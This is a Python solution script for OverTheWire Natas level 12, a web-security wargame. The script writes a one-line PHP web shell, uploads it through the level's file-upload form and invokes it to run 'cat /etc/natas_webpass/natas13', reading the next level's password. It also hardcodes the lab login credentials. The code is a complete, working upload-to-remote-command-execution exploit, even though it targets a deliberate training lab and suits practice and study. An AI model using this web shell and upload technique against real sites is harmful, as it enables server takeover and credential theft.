#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 12."""

import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas12.natas.labs.overthewire.org/"

lvl_user = "natas12"
lvl_pass = "YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG"

headers = {
    "User-Agent": UserAgent().random
    }

web_shell = open("cmd-8569eadb.php", "w")
web_shell.write("<?php system($_GET['cmd']); ?>")
web_shell.close()


files = {
    'uploadedfile': open('cmd-8569eadb.php' ,'rb')
    }

try:
    res_upload = r.post(
        url,
        files=files,
        data={"filename": "cmd-8569eadb.php"},
        headers=headers, 
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    if res_upload.status_code == 200:
        web_shell_path = res_upload.text.split("\n")[-5]
        web_shell_path = url + web_shell_path.split('"')[1]
        print("[WEB_SHELL]", web_shell_path)

    res = r.get(
        web_shell_path,
        files=files,
        params={"cmd": "cat /etc/natas_webpass/natas13"},
        headers=headers, 
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    status = res.status_code
    password = res.text.split("\n")[0] if status == 200 else ""
except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL] - [Status: {status}]",
        f"[Password({len(password)}): {password}]")
